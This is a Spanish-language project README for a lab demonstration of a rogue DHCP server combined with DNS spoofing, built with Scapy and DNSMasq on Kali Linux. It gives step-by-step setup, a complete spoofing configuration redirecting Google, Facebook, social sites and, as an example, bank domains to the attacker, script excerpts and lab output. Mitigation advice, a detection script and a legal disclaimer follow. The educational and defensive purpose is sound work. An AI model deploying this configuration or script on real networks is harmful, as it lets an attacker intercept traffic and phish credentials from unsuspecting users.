# 🎯 DHCP Rogue Server con DNS Spoofing - Ataque MITM

<div align="center">

![Network Security](https://img.shields.io/badge/Security-Pentesting-red)
![Python](https://img.shields.io/badge/Python-3.x-blue)
![Kali Linux](https://img.shields.io/badge/Platform-Kali%20Linux-purple)
![License](https://img.shields.io/badge/License-MIT-green)

**Implementación de servidor DHCP Rogue con DNS Spoofing para demostración de ataques Man-in-the-Middle**

</div>

---


---

## 📋 Descripción General

Este proyecto implementa un **ataque DHCP Rogue Server** combinado con **DNS Spoofing** utilizando Python, Scapy y DNSMasq en Kali Linux. El objetivo es demostrar vulnerabilidades en redes que no implementan medidas de seguridad adecuadas contra ataques Man-in-the-Middle (MITM).

### ¿Qué es un DHCP Rogue Server?

Un servidor DHCP Rogue es un servidor DHCP no autorizado en una red que proporciona configuraciones de red maliciosas a los clientes, permitiendo al atacante:

- 🔴 Interceptar todo el tráfico DNS
- 🔴 Redirigir dominios a IPs controladas por el atacante
- 🔴 Realizar ataques de phishing dirigidos
- 🔴 Capturar credenciales de usuarios
- 🔴 Realizar análisis de tráfico de red

---

## 🎯 Objetivo del Proyecto

### Objetivos Educativos

1. **Demostrar vulnerabilidades** en protocolos DHCP y DNS
2. **Comprender técnicas** de ataque Man-in-the-Middle
3. **Implementar contramedidas** de seguridad efectivas
4. **Analizar el impacto** de configuraciones de red inseguras

### Alcance Técnico

- ✅ Implementación de servidor DHCP falso con Scapy
- ✅ Configuración de DNS Spoofing con DNSMasq
- ✅ Intercepción y manipulación de peticiones DNS
- ✅ Documentación de resultados y análisis forense
- ✅ Propuesta de contramedidas de seguridad

---

## 🌐 Topología de Red

### Diagrama de Red

```
┌─────────────┐
                         │   Internet  │
                         │     Net     │
                         └──────┬──────┘
                                │ Gi0/0
                         ┌──────┴──────┐
                         │   Router    │
                         │    vIOS     │
                         └──────┬──────┘
                                │ Gi0/1
                    ┌───────────┴───────────┐
                    │                       │
             ┌──────┴──────┐         ┌─────┴──────┐
             │   Router    │         │   Router   │
             │    vIOS     │         │    vIOS    │
             └──────┬──────┘         └─────┬──────┘
                    │ Gi0/0                │ Gi0/0
                    │                      │
            ┌───────┴──────────────────────┴───────┐
            │           Switch (Gi0/1)              │
            │              vIOS                     │
            └───────┬──────────────┬────────────────┘
                    │ Gi0/2        │ Gi0/3
            ┌───────┴──────┐  ┌────┴─────────┐
            │  Kali Linux  │  │   Windows    │
            │  (Atacante)  │  │   (Víctima)  │
            │ 20.24.116.2  │  │20.24.116.100 │
            └──────────────┘  └──────────────┘


```

<img width="2085" height="1235" alt="image" src="https://github.com/user-attachments/assets/368246a7-72ff-439d-b1cc-bc8c446417d1" />





### Especificaciones de la Red

| Dispositivo | Interfaz | Dirección IP | Rol |
|-------------|----------|--------------|-----|
| **Router Principal** | Gi0/0 | NAT/Internet | Conexión WAN |
| **Router Principal** | Gi0/1 | 20.24.116.1 | Gateway Legítimo |
| **Switch Central** | Gi0/1 | Trunk | Interconexión |
| **Switch Central** | Gi0/2 | Access | Puerto Kali |
| **Switch Central** | Gi0/3 | Access | Puerto Windows |
| **Kali Linux** | eth0 | 20.24.116.2 | Servidor DHCP Rogue |
| **Windows** | Ethernet | 20.24.116.100 | Cliente Víctima |

### Configuración de Red

```
Red: 20.24.116.0/24
Máscara: 255.255.255.0
Gateway Legítimo: 20.24.116.1
Gateway Falso: 20.24.116.2 (Kali)
DNS Legítimo: 8.8.8.8, 1.1.1.1
DNS Falso: 20.24.116.2 (Kali)
Pool DHCP Rogue: 20.24.116.100 - 20.24.116.200
```

---

## 📦 Requisitos del Sistema

### Hardware Mínimo

- **CPU**: 2 cores o más
- **RAM**: 4 GB (8 GB recomendado)
- **Disco**: 20 GB libres
- **Red**: Adaptador Ethernet compatible

### Software Necesario

#### Sistema Operativo
```bash
Kali Linux 2024.x (Rolling Release)
o cualquier distribución Linux con soporte para:
  - Python 3.x
  - Scapy
  - DNSMasq
```

#### Dependencias de Python

```bash
# Paquetes requeridos
python3 (>= 3.8)
python3-pip
python3-scapy
dnsmasq
net-tools
iptables
```

### Permisos

- ⚠️ **Acceso root/sudo** es obligatorio
- ⚠️ **Privilegios de red** para manipulación de paquetes
- ⚠️ **Acceso a interfaces** de red en modo promiscuo

---

## 🔧 Instalación y Configuración

### Paso 1: Actualizar el Sistema

```bash
# Actualizar repositorios
sudo apt update && sudo apt upgrade -y

# Actualizar distribución completa
sudo apt dist-upgrade -y
```

### Paso 2: Instalar Dependencias

```bash
# Instalar Python 3 y herramientas
sudo apt install python3 python3-pip python3-dev -y

# Instalar Scapy
sudo pip3 install scapy --break-system-packages

# Instalar DNSMasq y herramientas de red
sudo apt install dnsmasq net-tools iptables -y

# Instalar herramientas adicionales (opcional)
sudo apt install wireshark tcpdump nmap -y
```

### Paso 3: Clonar el Repositorio

```bash
# Clonar desde GitHub
git clone https://github.com/tu-usuario/dhcp-rogue-attack.git
cd dhcp-rogue-attack

# Dar permisos de ejecución
chmod +x dhcp_rogue.py
```

### Paso 4: Configurar Interfaz de Red

```bash
# Listar interfaces disponibles
ip addr show

# Configurar IP estática en la interfaz (ejemplo: eth0)
sudo ifconfig eth0 20.24.116.2 netmask 255.255.255.0 up

# Verificar configuración
ip addr show eth0

# Habilitar IP Forwarding
sudo sysctl -w net.ipv4.ip_forward=1
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

### Paso 5: Configurar DNSMasq

```bash
# Crear archivo de configuración personalizado
sudo nano /etc/dnsmasq_mitm.conf
```

Contenido del archivo `/etc/dnsmasq_mitm.conf`:

```conf
# ============================================
# Configuración DNSMasq para DHCP Rogue MITM
# ============================================

# No leer /etc/resolv.conf del sistema
no-resolv

# Servidor DNS upstream para dominios no spoofed
server=8.8.8.8
server=1.1.1.1

# Interfaz de escucha
interface=eth0

# No vincular a otras interfaces
bind-interfaces

# Dominio local personalizado
domain=practica20241165.local

# Expandir nombres de host simples
expand-hosts

# Rango DHCP (sincronizado con dhcp_rogue.py)
dhcp-range=20.24.116.100,20.24.116.200,12h

# Opciones DHCP personalizadas
dhcp-option=option:router,20.24.116.2
dhcp-option=option:dns-server,20.24.116.2

# ============================================
# DNS SPOOFING - Redirecciones Maliciosas
# ============================================

# Redirigir dominios específicos a Kali
address=/google.com/20.24.116.2
address=/gooble.com/20.24.116.2
address=/facebook.com/20.24.116.2
address=/instagram.com/20.24.116.2
address=/twitter.com/20.24.116.2
address=/linkedin.com/20.24.116.2

# Wildcard para subdominios
address=/.google.com/20.24.116.2
address=/.facebook.com/20.24.116.2

# ============================================
# Logging y Debug
# ============================================

# Registrar todas las consultas DNS
log-queries

# Registrar todas las transacciones DHCP
log-dhcp

# Nivel de detalle de logs
log-facility=/var/log/dnsmasq_mitm.log

# No almacenar cache DNS
cache-size=0
```

---

## ⚙️ Funcionamiento del Ataque

### Flujo del Ataque DHCP Rogue

```
┌─────────────────────────────────────────────────────────────┐
│                    ATAQUE DHCP ROGUE                        │
└─────────────────────────────────────────────────────────────┘

1. DHCP DISCOVER (Cliente → Broadcast)
   ┌──────────┐                                    ┌──────────┐
   │ Windows  │ ──→ "¿Hay algún servidor DHCP?" ──→│ Network  │
   │ (Victim) │                                    │(Broadcast)│
   └──────────┘                                    └──────────┘
                                                          ↓
                                                    ┌──────────┐
                                                    │   Kali   │
                                                    │ (Rogue)  │
                                                    └──────────┘

2. DHCP OFFER (Servidor Rogue → Cliente)
   ┌──────────┐                                    ┌──────────┐
   │   Kali   │ ──→ "Te ofrezco IP: 20.24.116.100" │ Windows  │
   │ (Rogue)  │     DNS: 20.24.116.2 (¡TU KALI!)   │ (Victim) │
   └──────────┘                                    └──────────┘

3. DHCP REQUEST (Cliente → Broadcast)
   ┌──────────┐                                    ┌──────────┐
   │ Windows  │ ──→ "Acepto la oferta de Kali"  ──→│ Network  │
   │ (Victim) │                                    │(Broadcast)│
   └──────────┘                                    └──────────┘

4. DHCP ACK (Servidor Rogue → Cliente)
   ┌──────────┐                                    ┌──────────┐
   │   Kali   │ ──→ "Confirmado! Tu DNS es        →│ Windows  │
   │ (Rogue)  │      20.24.116.2 (SOLO KALI)"      │ (Victim) │
   └──────────┘                                    └──────────┘

5. DNS SPOOFING (Cliente consulta DNS)
   ┌──────────┐                                    ┌──────────┐
   │ Windows  │ ──→ "¿Cuál es la IP de google.com?"│   Kali   │
   │ (Victim) │                                    │(DNS Fake)│
   └──────────┘                                    └──────────┘
                                                          ↓
   ┌──────────┐                                    ┌──────────┐
   │ Windows  │ ←── "google.com = 20.24.116.2"  ←──│   Kali   │
   │ (Victim) │     (¡DIRECCIÓN FALSA!)            │(DNS Fake)│
   └──────────┘                                    └──────────┘

✅ ATAQUE EXITOSO: Todo el tráfico DNS pasa por el atacante
```

### Análisis del Protocolo DHCP

#### Paquete DHCP DISCOVER
```python
Ether / IP / UDP / BOOTP / DHCP
    Ether:
        src: 50:e7:98:00:0b:00 (MAC víctima)
        dst: ff:ff:ff:ff:ff:ff (Broadcast)
    IP:
        src: 0.0.0.0
        dst: 255.255.255.255
    UDP:
        sport: 68 (DHCP Client)
        dport: 67 (DHCP Server)
    BOOTP:
        op: 1 (Request)
        xid: Transaction ID único
    DHCP:
        message-type: DISCOVER
```

#### Paquete DHCP OFFER (Malicioso)
```python
Ether / IP / UDP / BOOTP / DHCP
    Ether:
        src: <MAC_Kali>
        dst: 50:e7:98:00:0b:00
    IP:
        src: 20.24.116.2 (Kali)
        dst: 255.255.255.255
    UDP:
        sport: 67 (DHCP Server)
        dport: 68 (DHCP Client)
    BOOTP:
        op: 2 (Reply)
        yiaddr: 20.24.116.100 (IP ofrecida)
        siaddr: 20.24.116.2 (Servidor DHCP)
    DHCP:
        message-type: OFFER
        server_id: 20.24.116.2
        subnet_mask: 255.255.255.0
        router: 20.24.116.2  ← Gateway falso
        name_server: 20.24.116.2  ← DNS falso (CRÍTICO)
        lease_time: 43200 (12 horas)
```

---

## 📸 Demostración Visual

### Fase 1: Antes del Ataque

**Estado Original de Windows:**

```cmd
C:\Windows\system32> ipconfig /all

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : practica20241165.local
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 50-E7-98-00-0B-00
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 20.24.116.5 (Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Lease Obtained. . . . . . . . . . : Friday, February 13, 2026 2:43:55 PM
   Lease Expires . . . . . . . . . . : Saturday, February 14, 2026 3:06:23 PM
   Default Gateway . . . . . . . . . : 20.24.116.1  ← Gateway legítimo
   DHCP Server . . . . . . . . . . . : 20.24.116.4  ← Servidor DHCP real
   DNS Servers . . . . . . . . . . . : 8.8.8.8      ← DNS de Google
                                       1.1.1.1      ← DNS de Cloudflare
```

<img width="875" height="438" alt="image" src="https://github.com/user-attachments/assets/8b3d2ca0-df8d-4d8b-b78c-f8d3014231c2" />

<img width="919" height="419" alt="image" src="https://github.com/user-attachments/assets/ed4e557b-5739-4bae-ad5e-bda51191678a" />


---

### Fase 2: Ejecución del Ataque

**Terminal 1 - Kali Linux (DHCP Rogue):**

```bash
root@kali:~# sudo python3 dhcp_rogue.py

╔══════════════════════════════════════════════════════════╗
║          DHCP ROGUE SERVER - SCAPY v2                    ║
║          DNS Forzado: SOLO Kali                          ║
╚══════════════════════════════════════════════════════════╝

[+] Interfaz: eth0
[+] IP del servidor DHCP falso: 20.24.116.2
[+] Gateway falso: 20.24.116.2
[+] DNS falso: 20.24.116.2 ← ÚNICO DNS
[+] Pool de IPs: 20.24.116.100 - 20.24.116.200
[+] Máscara de subred: 255.255.255.0
[+] Tiempo de lease: 12 horas

[*] Esperando solicitudes DHCP...

============================================================
[DISCOVER] Recibido de 50:e7:98:00:0b:00

[OFFER] Ofreciendo IP 20.24.116.100 a 50:e7:98:00:0b:00
[✓] DHCP OFFER enviado - DNS: 20.24.116.2

============================================================
[REQUEST] Recibido de 50:e7:98:00:0b:00

[ACK] Confirmando IP 20.24.116.100 a 50:e7:98:00:0b:00
[✓] DHCP ACK enviado
[✓✓] IP: 20.24.116.100
[✓✓] Gateway: 20.24.116.2
[✓✓] DNS: 20.24.116.2 ← SOLO TU KALI
```



<img width="896" height="785" alt="image" src="https://github.com/user-attachments/assets/ad5443d9-39c3-4fb1-b0ed-9bf1f115b169" />


**Terminal 2 - Kali Linux (DNSMasq):**

```bash
root@kali:~# sudo dnsmasq -C /etc/dnsmasq_mitm.conf -d

dnsmasq: started, version 2.89
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq: DNS service limited to local subnets
dnsmasq: DHCP, IP range 20.24.116.100 -- 20.24.116.200, lease time 12h
dnsmasq: DHCP, sockets bound exclusively to interface eth0
dnsmasq: reading /etc/dnsmasq_mitm.conf
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: cleared cache

# Consultas DNS interceptadas
dnsmasq: query[A] 6to4.ipv6.microsoft.com from 20.24.116.100
dnsmasq: config 6to4.ipv6.microsoft.com is 20.24.116.2

dnsmasq: query[A] wpad.practica20241165.local from 20.24.116.100
dnsmasq: config wpad.practica20241165.local is 20.24.116.2

dnsmasq: query[A] www.msftncsi.com from 20.24.116.100
dnsmasq: config www.msftncsi.com is 20.24.116.2
```

<img width="1268" height="952" alt="image" src="https://github.com/user-attachments/assets/b57fcb39-a431-4064-ba87-e79f3d5bc8b4" />



**Windows (Renovar DHCP):**

```cmd
C:\Windows\system32> netsh int ip reset
Reseting Global, OK!
Reseting Interface, OK!
Restart the computer to complete this action.

C:\Windows\system32> ipconfig /renew

Windows IP Configuration

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::d08:6d67:cfa4:d452z11
   IPv4 Address. . . . . . . . . . . : 20.24.116.100  ← IP del rogue
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 20.24.116.2    ← Kali como gateway
```

<img width="886" height="455" alt="image" src="https://github.com/user-attachments/assets/770b86a9-f8c6-41f4-b125-cbf27af3bf1f" />


---

### Fase 3: Verificación del Compromiso

**Windows - Configuración Comprometida:**

```cmd
C:\Windows\system32> ipconfig /all

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : practica20241165.local
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 50-E7-98-00-0B-00
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::d08:6d67:cfa4:d452z11(Preferred)
   IPv4 Address. . . . . . . . . . . : 20.24.116.100 (Preferred) ← IP asignada por rogue
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Lease Obtained. . . . . . . . . . : Friday, February 13, 2026 4:17:48 PM
   Lease Expires . . . . . . . . . . : Saturday, February 14, 2026 4:17:49 AM
   Default Gateway . . . . . . . . . : 20.24.116.2   ← KALI como gateway
   DHCP Server . . . . . . . . . . . : 20.24.116.2   ← KALI como DHCP
   DHCPv6 IAID . . . . . . . . . . . : 189818733
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-21-72-34-36-50-0A-00-01-00-00
   DNS Servers . . . . . . . . . . . : 8.8.8.8       ← Falso (realmente va a Kali)
                                       1.1.1.1       ← Falso (realmente va a Kali)
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

<img width="892" height="320" alt="image" src="https://github.com/user-attachments/assets/27e2051f-8bb4-4f72-a5ba-75069dcbda2d" />


**Prueba de DNS Spoofing:**

```cmd
C:\Windows\system32> nslookup gooble.com
Server:  Unknown
Address:  20.24.116.2  ← Servidor DNS (Kali)

Name:    gooble.com.practica20241165.local
Address:  20.24.116.2  ← Dirección falsa apuntando a Kali

C:\Windows\system32> nslookup google.com
Server:  Unknown
Address:  20.24.116.2

Name:    google.com.practica20241165.local
Address:  20.24.116.2  ← Google redirigido a Kali!
```

<img width="875" height="408" alt="image" src="https://github.com/user-attachments/assets/d3ce26f8-fd88-4276-8abe-52af32289466" />


---

## 🔍 Parámetros del Script

### Archivo: `dhcp_rogue.py`

#### Configuración Principal

```python
# ============================================
# CONFIGURACIÓN DEL ATAQUE DHCP ROGUE
# ============================================

IFACE = "eth0"                    # Interfaz de red (eth0, wlan0, etc.)
SERVER_IP = "20.24.116.2"         # IP del servidor DHCP falso (tu Kali)
SUBNET_MASK = "255.255.255.0"     # Máscara de subred
GATEWAY = "20.24.116.2"           # Gateway falso (tu Kali)
DNS_SERVER = "20.24.116.2"        # DNS falso - CRÍTICO PARA EL ATAQUE
LEASE_TIME = 43200                # Tiempo de lease en segundos (12 horas)

# Pool de direcciones IP
IP_POOL_START = 100               # Inicio del rango
IP_POOL_END = 200                 # Fin del rango
IP_BASE = "20.24.116."            # Base de la red
```

#### Funciones Principales

##### 1. `get_next_ip()`
```python
def get_next_ip():
    """
    Obtiene la siguiente IP disponible del pool.
    
    Returns:
        str: Dirección IP en formato string (ej: "20.24.116.100")
    """
    global current_ip
    if current_ip > IP_POOL_END:
        current_ip = IP_POOL_START  # Reiniciar pool si se agota
    ip = IP_BASE + str(current_ip)
    current_ip += 1
    return ip
```

##### 2. `dhcp_offer(packet)`
```python
def dhcp_offer(packet):
    """
    Envía un paquete DHCP OFFER al cliente.
    
    Args:
        packet: Paquete DHCP DISCOVER recibido
    
    Acciones:
        - Extrae MAC del cliente
        - Asigna IP del pool
        - Construye paquete DHCP OFFER malicioso
        - Configura DNS falso (20.24.116.2)
    """
    client_mac = packet[Ether].src
    xid = packet[BOOTP].xid
    
    # Asignar IP
    if client_mac in assigned_ips:
        offered_ip = assigned_ips[client_mac]
    else:
        offered_ip = get_next_ip()
        assigned_ips[client_mac] = offered_ip
    
    # Construir paquete DHCP OFFER
    dhcp = DHCP(options=[
        ("message-type", "offer"),
        ("server_id", SERVER_IP),
        ("lease_time", LEASE_TIME),
        ("subnet_mask", SUBNET_MASK),
        ("router", GATEWAY),           # Gateway falso
        ("name_server", DNS_SERVER),   # DNS falso - CLAVE DEL ATAQUE
        "end"
    ])
```

##### 3. `dhcp_ack(packet)`
```python
def dhcp_ack(packet):
    """
    Confirma la asignación de IP con DHCP ACK.
    
    Args:
        packet: Paquete DHCP REQUEST recibido
    
    Acciones:
        - Confirma IP asignada
        - Envía configuración de red maliciosa
        - Establece Kali como único DNS
    """
    # Configuración DHCP ACK idéntica a OFFER
    # Asegura que el DNS sea SOLO 20.24.116.2
```

##### 4. `dhcp_handler(packet)`
```python
def dhcp_handler(packet):
    """
    Manejador principal de paquetes DHCP.
    
    Args:
        packet: Paquete capturado en la interfaz
    
    Procesa:
        - DHCP DISCOVER (tipo 1) → Llama a dhcp_offer()
        - DHCP REQUEST (tipo 3) → Llama a dhcp_ack()
    """
    if DHCP in packet:
        dhcp_message_type = None
        for opt in packet[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == "message-type":
                dhcp_message_type = opt[1]
                break
        
        if dhcp_message_type == 1:      # DISCOVER
            dhcp_offer(packet)
        elif dhcp_message_type == 3:    # REQUEST
            dhcp_ack(packet)
```

#### Parámetros Críticos

| Parámetro | Valor | Descripción |
|-----------|-------|-------------|
| `DNS_SERVER` | `20.24.116.2` | **CRÍTICO** - Debe ser tu Kali para DNS Spoofing |
| `GATEWAY` | `20.24.116.2` | Redirecciona tráfico por el atacante |
| `SERVER_IP` | `20.24.116.2` | Identifica el servidor DHCP falso |
| `LEASE_TIME` | `43200` | 12 horas - Tiempo de control sobre la víctima |
| `IP_POOL_START` | `100` | Evita conflictos con IPs estáticas bajas |
| `IP_POOL_END` | `200` | Permite hasta 100 clientes simultáneos |

---

## 🌐 Configuración DNSMasq

### Iniciar DNSMasq en Modo Debug

```bash
# Detener servicio systemd si está corriendo
sudo systemctl stop dnsmasq

# Iniciar DNSMasq con configuración personalizada en modo debug
sudo dnsmasq -C /etc/dnsmasq_mitm.conf -d

# Deberías ver:
dnsmasq: started, version 2.89
dnsmasq: compile time options: IPv6 GNU-getopt DBus...
dnsmasq: DNS service limited to local subnets
dnsmasq: DHCP, IP range 20.24.116.100 -- 20.24.116.200, lease time 12h
dnsmasq: reading /etc/dnsmasq_mitm.conf
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: cleared cache
```

### Logs de DNSMasq en Tiempo Real

```bash
# Ver logs en otra terminal
sudo tail -f /var/log/dnsmasq_mitm.log

# O usar journalctl si está integrado
sudo journalctl -u dnsmasq -f
```

### Ejemplo de Consultas Interceptadas

```
dnsmasq: query[A] google.com from 20.24.116.100
dnsmasq: config google.com is 20.24.116.2

dnsmasq: query[AAAA] google.com from 20.24.116.100
dnsmasq: config google.com is NODATA-IPv6

dnsmasq: query[A] facebook.com from 20.24.116.100
dnsmasq: config facebook.com is 20.24.116.2

dnsmasq: query[A] github.com from 20.24.116.100
dnsmasq: forwarded github.com to 8.8.8.8
dnsmasq: reply github.com is 140.82.121.4
```

### Dominios Personalizados

Para añadir más dominios al spoofing, edita `/etc/dnsmasq_mitm.conf`:

```conf
# Redes sociales
address=/facebook.com/20.24.116.2
address=/instagram.com/20.24.116.2
address=/twitter.com/20.24.116.2
address=/tiktok.com/20.24.116.2

# Bancos (¡solo en entorno de pruebas!)
address=/bancopopular.com.do/20.24.116.2
address=/banreservas.com/20.24.116.2

# E-commerce
address=/amazon.com/20.24.116.2
address=/mercadolibre.com/20.24.116.2

# Comodín para subdominios
address=/.google.com/20.24.116.2
address=/.youtube.com/20.24.116.2
```

---

## 🛡️ Medidas de Mitigación

### Para Administradores de Red

#### 1. DHCP Snooping (Crítico)

**Concepto:** DHCP Snooping es una característica de seguridad en switches administrados que:
- Identifica puertos confiables vs no confiables
- Bloquea paquetes DHCP de puertos no autorizados
- Mantiene una tabla de bindings (IP-MAC-Puerto)

**Configuración en Cisco IOS:**

```cisco
! Habilitar DHCP Snooping globalmente
Switch(config)# ip dhcp snooping

! Habilitar en VLANs específicas
Switch(config)# ip dhcp snooping vlan 1,10,20

! Marcar puertos confiables (donde está el servidor DHCP legítimo)
Switch(config)# interface GigabitEthernet0/1
Switch(config-if)# ip dhcp snooping trust

! Configurar límite de paquetes DHCP por segundo
Switch(config)# interface range GigabitEthernet0/2-24
Switch(config-if-range)# ip dhcp snooping limit rate 10

! Verificar configuración
Switch# show ip dhcp snooping
Switch# show ip dhcp snooping binding
```

**Resultado:**
```
DHCP Snooping is enabled
DHCP Snooping is configured on following VLANs:
1,10,20

DHCP Snooping is operational on following VLANs:
1,10,20

Interface        Trusted    Rate limit (pps)
-------------    -------    ----------------
Gi0/1            yes        unlimited
Gi0/2            no         10
Gi0/3            no         10
```

#### 2. Dynamic ARP Inspection (DAI)

**Concepto:** DAI previene ataques ARP Spoofing validando paquetes ARP contra la tabla DHCP Snooping.

**Configuración:**

```cisco
! Habilitar DAI en VLANs
Switch(config)# ip arp inspection vlan 1,10,20

! Marcar puertos confiables
Switch(config)# interface GigabitEthernet0/1
Switch(config-if)# ip arp inspection trust

! Configurar validaciones adicionales
Switch(config)# ip arp inspection validate src-mac dst-mac ip

! Verificar
Switch# show ip arp inspection
```

#### 3. Port Security

**Limitar número de MACs por puerto:**

```cisco
Switch(config)# interface GigabitEthernet0/2
Switch(config-if)# switchport mode access
Switch(config-if)# switchport port-security
Switch(config-if)# switchport port-security maximum 2
Switch(config-if)# switchport port-security violation shutdown
Switch(config-if)# switchport port-security mac-address sticky
```

#### 4. 802.1X Authentication

**Autenticación de dispositivos antes de acceso a red:**

```cisco
! Habilitar AAA
Switch(config)# aaa new-model
Switch(config)# aaa authentication dot1x default group radius

! Configurar servidor RADIUS
Switch(config)# radius-server host 192.168.1.100 key SecretKey123

! Habilitar 802.1X en puerto
Switch(config)# interface GigabitEthernet0/2
Switch(config-if)# authentication port-control auto
Switch(config-if)# dot1x pae authenticator
```

#### 5. Monitoring y Alertas

**Implementar monitoreo activo:**

```bash
# Script de monitoreo para múltiples servidores DHCP
#!/bin/bash

# Detectar servidores DHCP en la red
sudo nmap --script broadcast-dhcp-discover -e eth0

# Verificar tabla ARP por anomalías
arp -a | grep -i "incomplete\|duplicate"

# Monitorear logs del servidor DHCP legítimo
tail -f /var/log/syslog | grep -i "DHCP"
```

#### 6. Segmentación de Red (VLANs)

**Separar tráfico crítico:**

```cisco
! Crear VLANs por departamento
Switch(config)# vlan 10
Switch(config-vlan)# name ADMINISTRACION

Switch(config)# vlan 20
Switch(config-vlan)# name USUARIOS

Switch(config)# vlan 30
Switch(config-vlan)# name SERVIDORES

! Asignar puertos a VLANs
Switch(config)# interface GigabitEthernet0/5
Switch(config-if)# switchport mode access
Switch(config-if)# switchport access vlan 30
```

### Para Usuarios Finales

#### 1. Configuración Manual de DNS

**Windows:**

```cmd
# Abrir Configuración de Red
ncpa.cpl

# O por línea de comandos
netsh interface ip set dns "Local Area Connection" static 8.8.8.8
netsh interface ip add dns "Local Area Connection" 1.1.1.1 index=2
```

**Linux:**

```bash
# Editar resolv.conf
sudo nano /etc/resolv.conf

# Añadir DNS confiables
nameserver 8.8.8.8
nameserver 1.1.1.1

# Hacer inmutable para prevenir cambios
sudo chattr +i /etc/resolv.conf
```

#### 2. Usar DNS sobre HTTPS (DoH)

**Firefox:**

```
Configuración → General → Configuración de red
→ Habilitar DNS sobre HTTPS
→ Proveedor: Cloudflare / NextDNS
```

**Chrome:**

```
Configuración → Privacidad y seguridad
→ Seguridad → Usar DNS seguro
→ Cloudflare (1.1.1.1)
```

**Sistema (Linux):**

```bash
# Instalar dnsproxy
sudo apt install dnsproxy

# Configurar DoH
dnsproxy -u https://dns.cloudflare.com/dns-query
```

#### 3. VPN en Redes No Confiables

**Instalar OpenVPN:**

```bash
# Linux
sudo apt install openvpn

# Conectar a VPN
sudo openvpn --config client.ovpn
```

**Ventajas:**
- ✅ Todo el tráfico encriptado
- ✅ DNS del proveedor VPN (no el de la red local)
- ✅ Protección contra MITM

#### 4. Monitoreo Personal

**Verificar configuración regularmente:**

```cmd
# Windows
ipconfig /all

# Verificar si el DNS es sospechoso
# DNS debería ser:
#   - 8.8.8.8 / 8.8.4.4 (Google)
#   - 1.1.1.1 / 1.0.0.1 (Cloudflare)
#   - DNS de tu ISP
# NO debería ser:
#   - IP privada (192.168.x.x, 10.x.x.x, 172.16.x.x)
#   - IP desconocida
```

#### 5. Validar Certificados SSL/TLS

**Siempre verificar:**

- 🔒 Candado verde en el navegador
- 🔒 Certificado válido y confiable
- 🔒 Nombre del dominio coincide con el certificado
- 🔒 No ignorar advertencias del navegador

### Detección Automatizada

#### Script de Detección de DHCP Rogue

```bash
#!/bin/bash
# dhcp_rogue_detector.sh

echo "=== DHCP Rogue Server Detector ==="

# Detectar múltiples servidores DHCP
echo "[*] Buscando servidores DHCP en la red..."
sudo nmap --script broadcast-dhcp-discover -e eth0 > /tmp/dhcp_scan.txt

# Contar servidores encontrados
SERVERS=$(grep -c "DHCP server" /tmp/dhcp_scan.txt)

if [ $SERVERS -gt 1 ]; then
    echo "[!] ALERTA: Se detectaron $SERVERS servidores DHCP!"
    echo "[!] Posible ataque DHCP Rogue en curso"
    cat /tmp/dhcp_scan.txt
    
    # Enviar alerta por email (opcional)
    mail -s "ALERTA: DHCP Rogue detectado" admin@empresa.com < /tmp/dhcp_scan.txt
else
    echo "[✓] Solo 1 servidor DHCP detectado (normal)"
fi

# Verificar tabla ARP por duplicados
echo "[*] Verificando tabla ARP..."
arp -a | grep -i "duplicate" && echo "[!] ALERTA: MACs duplicadas detectadas!"

rm /tmp/dhcp_scan.txt
```

#### Ejecutar Periódicamente con Cron

```bash
# Editar crontab
crontab -e

# Ejecutar cada 15 minutos
*/15 * * * * /usr/local/bin/dhcp_rogue_detector.sh
```

---

## 📚 Referencias

### Documentación Técnica

1. **RFC 2131** - Dynamic Host Configuration Protocol  
   https://tools.ietf.org/html/rfc2131

2. **RFC 1035** - Domain Names - Implementation and Specification  
   https://tools.ietf.org/html/rfc1035

3. **Scapy Documentation**  
   https://scapy.readthedocs.io/

4. **DNSMasq Manual**  
   http://www.thekelleys.org.uk/dnsmasq/doc.html

### Herramientas de Seguridad

- **Wireshark** - Análisis de paquetes de red  
  https://www.wireshark.org/

- **Ettercap** - Suite completa de ataques MITM  
  https://www.ettercap-project.org/

- **Bettercap** - Framework moderno de network attacks  
  https://www.bettercap.org/

- **Responder** - LLMNR/NBT-NS/MDNS Poisoner  
  https://github.com/lgandx/Responder

### Cursos y Certificaciones

- **OSCP** - Offensive Security Certified Professional
- **eJPT** - eLearnSecurity Junior Penetration Tester
- **CEH** - Certified Ethical Hacker
- **GPEN** - GIAC Penetration Tester

### Libros Recomendados

1. "The Web Application Hacker's Handbook" - Dafydd Stuttard
2. "Metasploit: The Penetration Tester's Guide" - David Kennedy
3. "Network Security Assessment" - Chris McNab
4. "Practical Packet Analysis" - Chris Sanders

---

## ⚖️ Disclaimer Legal

### ⚠️ ADVERTENCIA IMPORTANTE

Este proyecto es **exclusivamente para fines educativos y de investigación en seguridad informática**. El uso de estas técnicas sin autorización explícita y por escrito del propietario de la red es **ILEGAL** en la mayoría de las jurisdicciones.

### Marco Legal

#### En República Dominicana:
- **Ley 53-07 sobre Crímenes y Delitos de Alta Tecnología**
- **Artículo 10**: Acceso no autorizado a sistemas informáticos
- **Pena**: 6 meses a 2 años de prisión y multa

#### Internacionalmente:
- **Computer Fraud and Abuse Act (CFAA)** - Estados Unidos
- **Computer Misuse Act** - Reino Unido
